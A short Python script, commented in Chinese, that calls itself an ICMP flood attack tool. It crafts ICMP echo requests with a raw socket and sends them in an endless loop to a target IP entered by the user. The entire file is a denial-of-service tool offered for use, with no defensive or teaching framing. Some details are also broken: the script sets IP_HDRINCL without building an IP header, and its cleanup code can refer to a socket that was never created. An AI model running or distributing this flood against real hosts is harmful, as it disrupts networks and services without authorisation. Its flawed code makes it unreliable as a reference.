import os
import socket
import struct
import time

# 计算校验和
def checksum(source_string):
    sum = 0
    count_to = (len(source_string) // 2) * 2
    count = 0

    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xFFFFFFFF
        count = count + 2

    if count_to < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xFFFFFFFF

    sum = (sum >> 16) + (sum & 0xFFFF)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xFFFF
    answer = answer >> 8 | (answer << 8 & 0xFF00)
    return answer

# 构造 ICMP 数据包
def create_icmp_packet():
    type = 8  # ICMP Echo Request
    code = 0
    checksum_val = 0
    identifier = os.getpid() & 0xFFFF
    sequence = 1
    header = struct.pack('!BBHHH', type, code, checksum_val, identifier, sequence)
    data = b'abcdefghijklmnopqrstuvwabcdefghi'  # 数据部分

    checksum_val = checksum(header + data)
    header = struct.pack('!BBHHH', type, code, checksum_val, identifier, sequence)
    return header + data

# ICMP 洪水攻击函数
def icmp_flood(target_ip):
    try:
        # 创建原始套接字
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        packet = create_icmp_packet()
        print(f"开始向 {target_ip} 发送 ICMP 数据包...")

        while True:
            sock.sendto(packet, (target_ip, 1))
            time.sleep(0.01)  # 调整发送频率，避免过载
    except KeyboardInterrupt:
        print("\n攻击已停止。")
    except PermissionError:
        print("需要管理员权限运行此脚本。")
    except Exception as e:
        print(f"发生错误: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    target = input("请输入目标 IP 地址: ")
    icmp_flood(target)
